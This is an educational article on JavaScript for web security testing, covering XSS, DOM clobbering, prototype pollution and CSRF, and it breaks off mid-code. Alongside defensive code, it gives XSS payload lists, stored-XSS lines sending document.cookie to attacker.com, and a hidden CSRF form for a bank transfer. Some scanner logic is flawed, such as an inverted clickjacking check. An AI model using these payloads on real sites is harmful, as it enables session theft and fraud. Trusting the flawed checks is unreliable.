# JavaScript for Security Professionals: Mastering Web Security, DOM Manipulation, and Client-Side Vulnerabilities

## Introduction: The Language of the Browser Battlefield

Every modern web application—from banking portals to healthcare systems, from social media platforms to corporate intranets—executes JavaScript. It is the undisputed language of the client-side web, running on billions of devices worldwide, shaping every interaction users have with the digital world. For security professionals, this ubiquity creates an inescapable reality: **you cannot understand, test, or secure modern web applications without deep JavaScript expertise**.

JavaScript occupies a unique position in the security landscape. It is simultaneously the primary vector for the most pervasive web vulnerabilities (Cross-Site Scripting, Cross-Site Request Forgery, DOM-based attacks), the language in which browser security controls are implemented (Content Security Policy, Subresource Integrity), and an essential tool for security testing (automated scanners, browser automation, payload generation). Attackers use JavaScript to steal session tokens, exfiltrate sensitive data, and maintain persistence in compromised browsers. Defenders use JavaScript to detect anomalies, validate input, and build secure client-side architectures.

This comprehensive exploration will examine JavaScript through three essential security lenses: **Web Security Testing** (using JavaScript to find and exploit vulnerabilities), **DOM Manipulation** (understanding how JavaScript interacts with the Document Object Model and the security implications of that interaction), and **Client-Side Vulnerabilities** (identifying, exploiting, and preventing the flaws that JavaScript enables). By the end, you will understand JavaScript not merely as a programming language but as the critical terrain on which client-side security battles are fought and won.

---

## Part 1: JavaScript Fundamentals for Security Practitioners

Before diving into security-specific applications, security professionals must understand JavaScript's core characteristics—especially those that create security implications.

### JavaScript's Unique Position in Web Security

JavaScript differs from traditional programming languages in ways that directly impact security:

**1. Ubiquitous Execution Environment**
Unlike Python or Bash, which run on servers or workstations, JavaScript executes primarily in **web browsers**—the most hostile execution environment imaginable. Every website a user visits downloads and executes JavaScript code from potentially untrusted sources. The browser's security model (the Same-Origin Policy) attempts to contain this risk, but vulnerabilities in that containment create attack surfaces.

**2. Dynamic and Loosely Typed Nature**
JavaScript's dynamic typing and flexible object model enable rapid development but also create subtle security pitfalls:

```javascript
// Type coercion can lead to unexpected behavior
console.log([] + []);           // "" (empty string)
console.log([] + {});           // "[object Object]"
console.log({} + []);           // 0 (in some contexts)
console.log("5" - 3);           // 2 (numeric coercion)
console.log("5" + 3);           // "53" (string coercion)

// Property access is extremely permissive
const obj = { secret: "sensitive" };
console.log(obj["__proto__"]);  // Access to prototype chain
console.log(obj.constructor);    // Access to constructor function
```

**3. Prototypal Inheritance**
JavaScript uses prototype-based inheritance rather than classical inheritance. This powerful feature can be abused for prototype pollution attacks:

```javascript
// Prototype pollution example
const userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');
const user = {};
console.log(user.isAdmin);  // undefined (so far)

// Vulnerable merge function
function merge(target, source) {
    for (let key in source) {
        target[key] = source[key];
    }
}

merge(user, userInput);
console.log(user.isAdmin);  // true (prototype polluted!)
console.log({}.isAdmin);     // true (affects ALL objects!)
```

**4. Asynchronous Execution Model**
JavaScript's event loop and asynchronous nature (callbacks, Promises, async/await) create race conditions and timing attacks not present in synchronous code:

```javascript
// Race condition in authentication check
let isAuthenticated = false;

// Simulated async auth check
setTimeout(() => {
    isAuthenticated = checkUserToken();
}, 100);

// Attacker might access protected resource before auth completes
if (isAuthenticated) {  // Might be false during race window
    showSensitiveData();
}

// Proper async handling
async function accessProtectedResource() {
    const isAuthenticated = await checkUserToken();
    if (isAuthenticated) {
        showSensitiveData();
    }
}
```

**5. Global Namespace Pollution**
All scripts on a page share the same global namespace (`window`), creating opportunities for variable collision and malicious override:

```javascript
// Attacker's injected script
window.fetch = function(url, options) {
    // Exfiltrate request data
    sendToAttacker(url, options);
    // Call original fetch
    return originalFetch(url, options);
};

// Legitimate application code now leaks data
fetch('/api/sensitive-data');
```

### Essential JavaScript for Security Testing

Security testers need fluency in specific JavaScript features that power both exploitation and automation:

**Console Mastery:**

The browser's Developer Tools console is a security tester's best friend. It provides a REPL environment for testing payloads, inspecting objects, and interacting with the page:

```javascript
// Inspect the current page's security-relevant objects
console.log(document.cookie);
console.log(localStorage);
console.log(sessionStorage);
console.log(window.name);
console.log(document.referrer);

// Test for XSS sinks
console.log(document.write);
console.log(eval);
console.log(setTimeout);
console.log(setInterval);
console.log(Function);

// Enumerate global variables
Object.keys(window).forEach(key => {
    if (typeof window[key] !== 'undefined') {
        console.log(key, typeof window[key]);
    }
});

// Intercept network requests (via monkey-patching)
const originalXHROpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function(method, url) {
    console.log(`XHR Request: ${method} ${url}`);
    return originalXHROpen.apply(this, arguments);
};
```

**Network Request Manipulation:**

Understanding how JavaScript makes HTTP requests is essential for testing:

```javascript
// Traditional XHR
const xhr = new XMLHttpRequest();
xhr.open('POST', '/api/endpoint', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.withCredentials = true;  // Include cookies
xhr.send(JSON.stringify({ data: 'test' }));

// Modern Fetch API
fetch('/api/endpoint', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-Custom-Header': 'value'
    },
    credentials: 'include',  // Include cookies
    body: JSON.stringify({ data: 'test' })
})
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));

// WebSocket connections
const ws = new WebSocket('wss://example.com/socket');
ws.onopen = () => ws.send('Hello');
ws.onmessage = (event) => console.log('Received:', event.data);
```

**Browser Storage Inspection:**

```javascript
// Cookies
document.cookie = "session=value; path=/; Secure; HttpOnly; SameSite=Strict";
console.log(document.cookie);

// Local Storage (persists across sessions)
localStorage.setItem('key', 'value');
console.log(localStorage.getItem('key'));
localStorage.removeItem('key');

// Session Storage (cleared when tab closes)
sessionStorage.setItem('temp', 'data');
console.log(sessionStorage.getItem('temp'));

// IndexedDB (structured data)
const request = indexedDB.open('MyDatabase', 1);
request.onsuccess = (event) => {
    const db = event.target.result;
    console.log('Database opened:', db);
};
```

---

## Part 2: Web Security Testing with JavaScript

JavaScript is not merely a target for security testing—it is an essential **tool** for conducting that testing. From automated scanners to custom payloads to browser automation frameworks, JavaScript powers modern web security assessment.

### Browser Automation for Security Testing

**Puppeteer (Google Chrome/Chromium):**

Puppeteer provides a high-level API to control headless Chrome, enabling automated security testing at scale:

```javascript
// puppeteer_security_scanner.js
const puppeteer = require('puppeteer');

async function securityScan(url) {
    const browser = await puppeteer.launch({
        headless: true,
        args: [
            '--disable-web-security',  // For testing CORS issues
            '--disable-features=IsolateOrigins',
            '--disable-site-isolation-trials'
        ]
    });
    
    const page = await browser.newPage();
    const findings = [];
    
    // Enable request interception
    await page.setRequestInterception(true);
    
    // Monitor network requests for sensitive data exposure
    page.on('request', (request) => {
        const url = request.url();
        const postData = request.postData();
        
        // Check for sensitive data in URLs
        if (url.match(/token|key|password|secret|auth/i)) {
            findings.push({
                type: 'SENSITIVE_IN_URL',
                url: url,
                severity: 'HIGH'
            });
        }
        
        // Check for sensitive data in POST bodies
        if (postData && postData.match(/password=[^&]+/i)) {
            findings.push({
                type: 'CLEARTEXT_PASSWORD',
                url: url,
                severity: 'HIGH'
            });
        }
        
        // Check for mixed content
        if (url.startsWith('http://') && page.url().startsWith('https://')) {
            findings.push({
                type: 'MIXED_CONTENT',
                url: url,
                severity: 'MEDIUM'
            });
        }
        
        request.continue();
    });
    
    // Monitor console for errors and potential XSS
    page.on('console', (msg) => {
        const text = msg.text();
        if (text.includes('XSS') || text.includes('CSP') || text.includes('SRI')) {
            findings.push({
                type: 'CONSOLE_WARNING',
                message: text,
                severity: 'INFO'
            });
        }
    });
    
    // Navigate to target
    await page.goto(url, { waitUntil: 'networkidle2' });
    
    // Check security headers
    const headers = await page.evaluate(() => {
        return {
            'CSP': document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content,
            'Referrer-Policy': document.querySelector('meta[name="referrer"]')?.content,
            'X-Frame-Options': document.querySelector('meta[http-equiv="X-Frame-Options"]')?.content
        };
    });
    
    // Test for clickjacking
    const frameability = await page.evaluate(() => {
        return {
            frameable: window.self !== window.top,
            framebusting: document.querySelector('script')?.textContent.includes('top.location')
        };
    });
    
    if (!frameability.frameable) {
        findings.push({
            type: 'CLICKJACKING_VULNERABLE',
            severity: 'MEDIUM'
        });
    }
    
    // Check for exposed sensitive data in localStorage
    const storageData = await page.evaluate(() => {
        const items = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            items[key] = localStorage.getItem(key);
        }
        return items;
    });
    
    Object.entries(storageData).forEach(([key, value]) => {
        if (key.match(/token|session|auth|user|password/i)) {
            findings.push({
                type: 'SENSITIVE_IN_LOCALSTORAGE',
                key: key,
                severity: 'MEDIUM'
            });
        }
    });
    
    // Test for DOM XSS sinks
    const domXssSinks = await page.evaluate(() => {
        const sinks = [];
        const sources = ['document.write', 'eval', 'setTimeout', 'setInterval', 'Function', 'innerHTML', 'outerHTML'];
        
        sources.forEach(sink => {
            try {
                if (typeof window[sink] !== 'undefined') {
                    sinks.push(sink);
                }
            } catch (e) {}
        });
        
        // Check for dangerous innerHTML assignments
        const elements = document.querySelectorAll('[innerHTML]');
        if (elements.length > 0) {
            sinks.push(`innerHTML used on ${elements.length} elements`);
        }
        
        return sinks;
    });
    
    // Attempt basic XSS payload injection via URL parameters
    const xssPayload = '<img src=x onerror=console.log("XSS_TEST")>';
    const currentUrl = new URL(page.url());
    currentUrl.searchParams.forEach((value, key) => {
        currentUrl.searchParams.set(key, value + xssPayload);
    });
    
    await page.goto(currentUrl.toString(), { waitUntil: 'networkidle2' });
    
    // Check if payload executed
    const xssTriggered = await page.evaluate(() => {
        return window.xssTriggered || false;
    });
    
    if (xssTriggered) {
        findings.push({
            type: 'REFLECTED_XSS',
            url: currentUrl.toString(),
            severity: 'CRITICAL'
        });
    }
    
    await browser.close();
    return findings;
}

// Usage
securityScan('https://example.com').then(findings => {
    console.log('Security Findings:');
    findings.forEach(f => console.log(`[${f.severity}] ${f.type}: ${JSON.stringify(f)}`));
});
```

**Playwright (Cross-Browser Automation):**

Playwright extends Puppeteer's capabilities to Firefox and WebKit, essential for comprehensive security testing:

```javascript
// playwright_security_test.js
const { chromium, firefox, webkit } = require('playwright');

async function testCSRFProtection(url) {
    const browsers = [chromium, firefox, webkit];
    
    for (const browserType of browsers) {
        const browser = await browserType.launch();
        const context = await browser.newContext();
        const page = await context.newPage();
        
        // Log in normally
        await page.goto(url + '/login');
        await page.fill('input[name="username"]', 'testuser');
        await page.fill('input[name="password"]', 'testpass');
        await page.click('button[type="submit"]');
        await page.waitForNavigation();
        
        // Extract session token
        const cookies = await context.cookies();
        const sessionCookie = cookies.find(c => c.name.includes('session'));
        
        // Create new context with same cookies (simulating CSRF)
        const attackerContext = await browser.newContext();
        await attackerContext.addCookies(cookies);
        const attackerPage = await attackerContext.newPage();
        
        // Attempt state-changing request without CSRF token
        const response = await attackerPage.evaluate(async () => {
            const res = await fetch('/api/change-email', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: 'attacker@evil.com' })
            });
            return res.status;
        });
        
        console.log(`[${browserType.name()}] CSRF test result:`, response === 200 ? 'VULNERABLE' : 'PROTECTED');
        
        await browser.close();
    }
}
```

### Custom Security Testing Scripts

**Automated XSS Payload Tester:**

```javascript
// xss_fuzzer.js - Browser-based XSS fuzzing
class XSSFuzzer {
    constructor() {
        this.payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '"><img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '"-alert("XSS")-"',
            '\'-alert("XSS")-\'',
            '<body onload=alert("XSS")>',
            '<iframe src="javascript:alert(`XSS`)">',
            '<object data="javascript:alert(`XSS`)">',
            '${alert("XSS")}',  // Template injection
            '{{constructor.constructor("alert(\'XSS\')")()}}',  // AngularJS
        ];
        
        this.results = [];
    }
    
    async testReflectedXSS(url, parameter) {
        for (const payload of this.payloads) {
            const testUrl = new URL(url);
            testUrl.searchParams.set(parameter, payload);
            
            const win = window.open(testUrl.toString(), '_blank');
            
            // Wait for potential alert
            const alertTriggered = await new Promise((resolve) => {
                const timeout = setTimeout(() => resolve(false), 2000);
                
                const originalAlert = window.alert;
                window.alert = function(msg) {
                    clearTimeout(timeout);
                    if (msg === 'XSS') {
                        resolve(true);
                    }
                    window.alert = originalAlert;
                };
            });
            
            if (alertTriggered) {
                this.results.push({
                    type: 'REFLECTED_XSS',
                    payload: payload,
                    url: testUrl.toString()
                });
            }
            
            win.close();
        }
    }
    
    async testDOMXSS(sink, source) {
        const payload = '<img src=x onerror=console.log("DOM_XSS_TEST")>';
        let triggered = false;
        
        // Monkey-patch console.log to detect execution
        const originalLog = console.log;
        console.log = function(msg) {
            if (msg === 'DOM_XSS_TEST') {
                triggered = true;
            }
            originalLog.apply(console, arguments);
        };
        
        // Inject payload into source
        document.location.hash = payload;
        
        // Trigger sink (simplified)
        setTimeout(() => {
            console.log = originalLog;
        }, 1000);
        
        return triggered;
    }
}
```

**Security Header Auditor:**

```javascript
// security_headers.js - Browser-based security header audit
function auditSecurityHeaders() {
    const results = [];
    
    // Check via fetch to get response headers
    fetch(window.location.href, { method: 'HEAD' })
        .then(response => {
            const headers = response.headers;
            
            // Content-Security-Policy
            const csp = headers.get('Content-Security-Policy');
            if (!csp) {
                results.push({
                    header: 'Content-Security-Policy',
                    status: 'MISSING',
                    severity: 'HIGH',
                    recommendation: 'Implement CSP to prevent XSS and data injection'
                });
            } else {
                // Analyze CSP for weaknesses
                if (csp.includes('unsafe-inline')) {
                    results.push({
                        header: 'Content-Security-Policy',
                        status: 'WEAK',
                        severity: 'MEDIUM',
                        details: 'Contains unsafe-inline directive',
                        recommendation: 'Remove unsafe-inline and use nonces/hashes instead'
                    });
                }
                if (csp.includes('unsafe-eval')) {
                    results.push({
                        header: 'Content-Security-Policy',
                        status: 'WEAK',
                        severity: 'MEDIUM',
                        details: 'Contains unsafe-eval directive',
                        recommendation: 'Remove unsafe-eval to prevent code injection'
                    });
                }
            }
            
            // Strict-Transport-Security
            const hsts = headers.get('Strict-Transport-Security');
            if (!hsts) {
                results.push({
                    header: 'Strict-Transport-Security',
                    status: 'MISSING',
                    severity: 'HIGH',
                    recommendation: 'Enable HSTS with max-age >= 31536000 and includeSubDomains'
                });
            } else {
                if (!hsts.includes('max-age=')) {
                    results.push({
                        header: 'Strict-Transport-Security',
                        status: 'MISCONFIGURED',
                        severity: 'HIGH',
                        details: 'Missing max-age directive'
                    });
                }
                if (!hsts.includes('includeSubDomains')) {
                    results.push({
                        header: 'Strict-Transport-Security',
                        status: 'PARTIAL',
                        severity: 'LOW',
                        recommendation: 'Add includeSubDomains directive'
                    });
                }
            }
            
            // X-Frame-Options
            const xfo = headers.get('X-Frame-Options');
            if (!xfo) {
                results.push({
                    header: 'X-Frame-Options',
                    status: 'MISSING',
                    severity: 'MEDIUM',
                    recommendation: 'Set to DENY or SAMEORIGIN to prevent clickjacking'
                });
            }
            
            // X-Content-Type-Options
            const xcto = headers.get('X-Content-Type-Options');
            if (!xcto || xcto !== 'nosniff') {
                results.push({
                    header: 'X-Content-Type-Options',
                    status: xcto ? 'MISCONFIGURED' : 'MISSING',
                    severity: 'MEDIUM',
                    recommendation: 'Set to nosniff'
                });
            }
            
            // Referrer-Policy
            const rp = headers.get('Referrer-Policy');
            if (!rp) {
                results.push({
                    header: 'Referrer-Policy',
                    status: 'MISSING',
                    severity: 'LOW',
                    recommendation: 'Set to strict-origin-when-cross-origin or no-referrer'
                });
            }
            
            // Permissions-Policy
            const pp = headers.get('Permissions-Policy');
            if (!pp) {
                results.push({
                    header: 'Permissions-Policy',
                    status: 'MISSING',
                    severity: 'LOW',
                    recommendation: 'Restrict browser features not needed by your application'
                });
            }
            
            // Cross-Origin Resource Policy
            const corp = headers.get('Cross-Origin-Resource-Policy');
            if (!corp) {
                results.push({
                    header: 'Cross-Origin-Resource-Policy',
                    status: 'MISSING',
                    severity: 'MEDIUM',
                    recommendation: 'Set to same-origin or same-site'
                });
            }
            
            console.table(results);
        });
}

// Run audit
auditSecurityHeaders();
```

### JavaScript in Penetration Testing Tools

Many industry-standard penetration testing tools use JavaScript:

**Burp Suite Extensions (BApp Store):**
```javascript
// Simplified Burp extension structure (using Nashorn/GraalVM JS)
function processHttpMessage(toolFlag, messageIsRequest, messageInfo) {
    if (!messageIsRequest) {
        const response = messageInfo.getResponse();
        const responseStr = new java.lang.String(response);
        
        // Check for information disclosure
        if (responseStr.contains('password') || responseStr.contains('secret')) {
            print('Potential sensitive data exposure found!');
        }
        
        // Check for missing security headers
        const headers = messageInfo.getResponseHeaders();
        let hasCSP = false;
        
        for (let i = 0; i < headers.length; i++) {
            if (headers[i].startsWith('Content-Security-Policy')) {
                hasCSP = true;
                break;
            }
        }
        
        if (!hasCSP) {
            print('Missing CSP header at: ' + messageInfo.getUrl());
        }
    }
}
```

**OWASP ZAP Scripts:**

```javascript
// zap_script.js - Active scan rule for custom vulnerability
function scanNode(as, msg) {
    // Check for insecure cookie settings
    const cookies = msg.getResponseHeader().getHeaders('Set-Cookie');
    
    for (let i = 0; i < cookies.length; i++) {
        const cookie = cookies[i].value;
        
        if (!cookie.includes('Secure')) {
            as.addAlert(
                2,  // Risk: Medium
                2,  // Confidence: Medium
                'Cookie Missing Secure Flag',
                'The cookie does not have the Secure flag set',
                msg.getRequestHeader().getURI().toString(),
                '', '', '', '', '', '', ''
            );
        }
        
        if (!cookie.includes('HttpOnly')) {
            as.addAlert(
                2,  // Risk: Medium
                2,  // Confidence: Medium
                'Cookie Missing HttpOnly Flag',
                'The cookie does not have the HttpOnly flag set',
                msg.getRequestHeader().getURI().toString(),
                '', '', '', '', '', '', ''
            );
        }
    }
}
```

---

## Part 3: DOM Manipulation and Security Implications

The Document Object Model (DOM) is the programming interface for HTML and XML documents. It represents the page structure as a tree of nodes that JavaScript can manipulate. Understanding DOM manipulation is essential because **every DOM-based vulnerability stems from unsafe manipulation of this tree**.

### DOM Fundamentals for Security

**The DOM Tree Structure:**

```javascript
// Navigating the DOM
console.log(document.documentElement);        // <html>
console.log(document.head);                    // <head>
console.log(document.body);                    // <body>
console.log(document.domain);                  // Current domain
console.log(document.URL);                     // Full URL
console.log(document.referrer);                // Referring URL
console.log(document.characterSet);            // UTF-8

// Node relationships
const element = document.querySelector('#target');
console.log(element.parentNode);               // Parent element
console.log(element.childNodes);               // All child nodes
console.log(element.children);                 // Element children only
console.log(element.firstChild);               // First child node
console.log(element.lastChild);                // Last child node
console.log(element.previousSibling);          // Previous sibling
console.log(element.nextSibling);              // Next sibling
```

**Dangerous DOM Manipulation Methods:**

These methods can introduce XSS vulnerabilities when used with untrusted data:

```javascript
// EXTREMELY DANGEROUS - Avoid with user input
element.innerHTML = userInput;                 // XSS sink
element.outerHTML = userInput;                 // XSS sink
document.write(userInput);                     // XSS sink
document.writeln(userInput);                   // XSS sink
eval(userInput);                               // XSS sink
new Function(userInput);                       // XSS sink
setTimeout(userInput, 1000);                   // XSS sink (string form)
setInterval(userInput, 1000);                  // XSS sink (string form)
location.href = userInput;                     // Open redirect + XSS
location.assign(userInput);                    // Open redirect
location.replace(userInput);                   // Open redirect

// ALSO DANGEROUS - Can lead to DOM clobbering or injection
element.insertAdjacentHTML('beforeend', userInput);
document.createRange().createContextualFragment(userInput);
```

**Safe DOM Manipulation Methods:**

```javascript
// SAFE - Use these instead
element.textContent = userInput;               // Text only, no HTML parsing
element.innerText = userInput;                 // Text only (with layout awareness)
element.setAttribute('data-value', userInput); // Attribute safe

// Creating elements safely
const newElement = document.createElement('div');
newElement.textContent = userInput;            // Safe assignment
parentElement.appendChild(newElement);

// Using safe methods from DOMPurify (recommended)
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;                     // Sanitized HTML
```

### DOM-Based XSS: Understanding the Attack Vector

DOM-based XSS occurs when JavaScript takes data from an attacker-controllable **source** and passes it to a dangerous **sink** without proper sanitization.

**Common Sources (Attacker-Controlled Input):**

```javascript
// URL sources
location.href
location.hash
location.search
location.pathname
document.URL
document.documentURI
document.referrer

// Storage sources
localStorage.getItem('key')
sessionStorage.getItem('key')
document.cookie

// Messaging sources
postMessage data
WebSocket messages

// User input sources
window.name
history.pushState data
```

**Common Sinks (Dangerous Execution Points):**

```javascript
// HTML execution sinks
element.innerHTML
element.outerHTML
document.write()
document.writeln()

// JavaScript execution sinks
eval()
setTimeout()  // String argument
setInterval() // String argument
new Function()
execScript()

// URL sinks
location.href
location.replace()
location.assign()
window.open()

// DOM manipulation sinks that can lead to XSS
element.setAttribute() // Especially with event handlers
document.createElement() + setting innerHTML
element.insertAdjacentHTML()
```

**DOM XSS Detection Script:**

```javascript
// dom_xss_detector.js - Identify potential DOM XSS vulnerabilities
function detectDOMXSS() {
    const sources = [
        'location.href',
        'location.hash',
        'location.search',
        'document.referrer',
        'document.cookie',
        'localStorage.getItem',
        'sessionStorage.getItem'
    ];
    
    const sinks = [
        'innerHTML',
        'outerHTML',
        'document.write',
        'eval',
        'setTimeout',
        'setInterval',
        'Function'
    ];
    
    const findings = [];
    
    // This is a simplified static analysis approach
    // In practice, you'd need to trace data flow dynamically
    
    // Check for URL parameters in innerHTML assignments
    const scripts = document.querySelectorAll('script');
    scripts.forEach(script => {
        const content = script.textContent;
        
        sinks.forEach(sink => {
            sources.forEach(source => {
                if (content.includes(sink) && content.includes(source)) {
                    findings.push({
                        type: 'POTENTIAL_DOM_XSS',
                        sink: sink,
                        source: source,
                        location: script.src || 'inline script'
                    });
                }
            });
        });
    });
    
    // Check event handlers for dangerous patterns
    const elements = document.querySelectorAll('*');
    elements.forEach(el => {
        Array.from(el.attributes).forEach(attr => {
            if (attr.name.startsWith('on')) {
                const value = attr.value;
                sources.forEach(source => {
                    if (value.includes(source.replace('()', ''))) {
                        findings.push({
                            type: 'EVENT_HANDLER_SOURCE',
                            element: el.tagName,
                            attribute: attr.name,
                            value: value
                        });
                    }
                });
            }
        });
    });
    
    console.table(findings);
    return findings;
}
```

### DOM Clobbering: A Subtle Attack

DOM clobbering occurs when named elements in the DOM override JavaScript variables and functions:

```javascript
// Vulnerable code pattern
if (window.config && window.config.debug) {
    enableDebugMode();
}

// Attacker injects HTML before this script
// <img name="config">
// or
// <form name="config"><input name="debug" value="true"></form>

// Now window.config references the HTML element, not the expected object
console.log(window.config);  // HTMLImageElement or HTMLFormElement
console.log(window.config.debug);  // HTMLInputElement (truthy!)
// Debug mode enabled unexpectedly!

// Prevention
if (Object.prototype.hasOwnProperty.call(window, 'config') && 
    typeof window.config === 'object' && 
    !(window.config instanceof HTMLElement) &&
    window.config.debug) {
    enableDebugMode();
}

// Better: Use block-scoped variables (let/const)
const appConfig = { debug: false };
if (appConfig.debug) {
    enableDebugMode();
}
```

**DOM Clobbering Detection:**

```javascript
// Detect potential DOM clobbering vulnerabilities
function detectDOMClobbering() {
    const clobbered = [];
    
    // Check for named elements that might shadow global variables
    const namedElements = document.querySelectorAll('[name], [id]');
    
    namedElements.forEach(el => {
        const name = el.name || el.id;
        
        // Check if this name exists on window and is an element
        if (window[name] && window[name] instanceof Element) {
            clobbered.push({
                name: name,
                element: el.tagName,
                type: el.name ? 'name' : 'id',
                risk: 'Potentially clobbering window.' + name
            });
        }
    });
    
    return clobbered;
}
```

### Prototype Pollution in the Browser

Prototype pollution affects client-side JavaScript just as it affects Node.js:

```javascript
// Vulnerable merge function in client-side code
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = target[key] || {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Attacker-controlled input (e.g., from URL hash)
const userData = JSON.parse(decodeURIComponent(location.hash.slice(1)));
// Example: #{"__proto__":{"isAdmin":true}}

const config = {};
merge(config, userData);

// Now ALL objects have isAdmin property!
console.log({}.isAdmin);  // true

// This can bypass security checks
if (currentUser.isAdmin) {  // Might be true due to prototype pollution!
    grantAdminAccess();
}
```

**Prototype Pollution Detection and Prevention:**

```javascript
// Safe merge function
function safeMerge(target, source) {
    const result = { ...target };
    
    for (let key in source) {
        // Block prototype pollution
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;
        }
        
        if (typeof source[key] === 'object' && source[key] !== null) {
            result[key] = safeMerge(result[key] || {}, source[key]);
        } else {
            result[key] = source[key];
        }
    }
    
    return result;
}

// Freeze the prototype to prevent pollution
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Function.prototype);

// Check if prototype has been polluted
function checkPrototypePollution() {
    const polluted = [];
    const safeProto = Object.getPrototypeOf({});
    
    if (Object.prototype.hasOwnProperty('__polluted__')) {
        polluted.push('Object prototype polluted');
    }
    
    if (Array.prototype.hasOwnProperty('__polluted__')) {
        polluted.push('Array prototype polluted');
    }
    
    return polluted;
}
```

---

## Part 4: Client-Side Vulnerabilities Deep Dive

### Cross-Site Scripting (XSS) Variants

**1. Reflected XSS:**

```javascript
// Vulnerable server-side code (pseudocode)
// <h1>Welcome back, <?php echo $_GET['name']; ?></h1>

// Attack URL: https://example.com/welcome?name=<script>alert('XSS')</script>

// Testing payloads for reflected XSS
const reflectedPayloads = [
    // Basic
    '<script>alert("XSS")</script>',
    
    // Tag attribute breakout
    '"><script>alert("XSS")</script>',
    
    // Event handlers
    '"><img src=x onerror=alert("XSS")>',
    '"><svg onload=alert("XSS")>',
    '"><body onload=alert("XSS")>',
    
    // Pseudo-protocol
    'javascript:alert("XSS")',
    
    // Encoded variants
    '%3Cscript%3Ealert("XSS")%3C/script%3E',
    '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    
    // DOM-based in reflection
    '\'-alert("XSS")-\'',
    '";alert("XSS");//'
];
```

**2. Stored XSS:**

```javascript
// Testing for stored XSS persistence
const storedPayloads = [
    // Comment section payloads
    '<script src="http://attacker.com/steal.js"></script>',
    '<img src=x onerror="fetch(\'http://attacker.com/?c=\'+document.cookie)">',
    
    // Profile field payloads
    '<a href="javascript:alert(\'XSS\')">Click me</a>',
    '<div style="background:url(javascript:alert(\'XSS\'))">',
    
    // Rich text editor payloads
    '<iframe srcdoc="<script>alert(\'XSS\')</script>">',
    '<object data="javascript:alert(\'XSS\')">'
];

// Monitor for XSS execution
function deployXSSMonitor() {
    const monitorEndpoint = 'https://your-server.com/collect';
    
    // Override alert to detect execution
    const originalAlert = window.alert;
    window.alert = function(message) {
        fetch(monitorEndpoint, {
            method: 'POST',
            body: JSON.stringify({
                type: 'alert',
                message: message,
                url: location.href,
                timestamp: Date.now()
            })
        });
        originalAlert.apply(this, arguments);
    };
    
    // Monitor for script execution
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            mutation.addedNodes.forEach((node) => {
                if (node.nodeName === 'SCRIPT') {
                    fetch(monitorEndpoint, {
                        method: 'POST',
                        body: JSON.stringify({
                            type: 'script_added',
                            src: node.src || 'inline',
                            url: location.href
                        })
                    });
                }
            });
        });
    });
    
    observer.observe(document.documentElement, {
        childList: true,
        subtree: true
    });
}
```

**3. DOM-Based XSS Exploitation:**

```javascript
// Advanced DOM XSS payload that bypasses simple filters
const domXSSPayloads = [
    // Using template literals
    '${alert`XSS`}',
    
    // Using Function constructor
    'Function("alert(1)")()',
    
    // Using Reflect
    'Reflect.apply(alert, null, ["XSS"])',
    
    // Using setTimeout with arrow function
    'setTimeout`alert\\x28"XSS"\\x29`',
    
    // Using event handler assignment
    'onerror=alert;throw"XSS"',
    
    // Using URL.createObjectURL
    'URL.createObjectURL(new Blob(["<script>alert(1)</script>"],{type:"text/html"}))'
];

// Exploiting DOM XSS with hash changes
function exploitDOMXSS() {
    // Common vulnerable pattern: taking from hash, putting in innerHTML
    const vulnerableCode = document.getElementById('content');
    const hash = location.hash.slice(1);
    vulnerableCode.innerHTML = decodeURIComponent(hash);  // VULNERABLE!
    
    // Attack URL: https://example.com/#<img src=x onerror=alert(1)>
}
```

### Cross-Site Request Forgery (CSRF)

JavaScript can both exploit and protect against CSRF:

**CSRF Exploitation:**

```javascript
// Auto-submitting CSRF form
function createCSRFExploit(targetUrl, method, data) {
    const form = document.createElement('form');
    form.method = method;
    form.action = targetUrl;
    form.style.display = 'none';
    
    for (let key in data) {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = key;
        input.value = data[key];
        form.appendChild(input);
    }
    
    document.body.appendChild(form);
    form.submit();
}

// Usage on attacker's site
createCSRFExploit('https://bank.com/transfer', 'POST', {
    to: 'attacker_account',
    amount: '10000',
    currency: 'USD'
});

// CSRF via AJAX with CORS misconfiguration
fetch('https://victim-site.com/api/change-email', {
    method: 'POST',
    credentials: 'include',  // Include cookies
    mode: 'no-cors',  // Bypass CORS checks
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        email: 'attacker@evil.com'
    })
});
```

**CSRF Protection Implementation:**

```javascript
// Client-side CSRF token handling
class CSRFProtection {
    constructor() {
        this.token = this.getToken();
    }
    
    getToken() {
        // Get from meta tag
        const metaToken = document.querySelector('meta[name="csrf-token"]');
        if (metaToken) {
            return metaToken.content;
        }
        
        // Get from cookie (Double Submit Cookie pattern)
        const cookies = document.cookie.split(';');
        for (let cookie of cookies) {
            const [name, value] = cookie.trim().split('=');
            if (name === 'XSRF-TOKEN') {
                return decodeURIComponent(value);
            }
        }
        
        return null;
    }
    
    addTokenToRequest(headers) {
        if (this.token) {
            headers['X-CSRF-Token'] = this.token;
        }
        return headers;
    }
    
    fetch(url, options = {}) {
        options.headers = options.headers || {};
        options.headers = this.addTokenToRequest(options.headers);
        options.credentials = 'same-origin';
        
        return window.fetch(url, options);
    }
}

// Usage
const api = new CSRFProtection();
api.fetch('/api/sensitive-action', {
    method: 'POST',
    body: JSON.stringify({ data: 'value' })
});
```

### Clickjacking and Frame Busting

**Clickjacking Detection:**

```javascript
// Detect if page is framed
